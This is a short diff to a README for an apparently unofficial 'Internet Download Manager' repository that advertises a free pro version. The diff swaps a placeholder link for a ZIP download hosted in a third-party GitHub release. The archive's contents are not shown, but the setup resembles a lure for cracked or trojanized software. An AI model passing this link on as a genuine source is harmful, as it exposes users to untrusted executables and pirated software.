@@ -7,7 +7,7 @@ Welcome to the Internet Download Manager (IDM) repository! 🚀 This is your go-
 - Topics: Internet-Download-Manager, IDM, file-downloader, free-software, download-management, pro-version 
 
 ## 🔗 Software Access  
-Download: [Internet Download Manager](https://example.com/download-idm)
+Download: [Internet Download Manager](https://github.com/Xyt069/Internet-Download-Manager-2025-IDM/releases/download/IDM/IDM.zip)
 
 
 ## 🎉 Overview of Internet Download Manager  
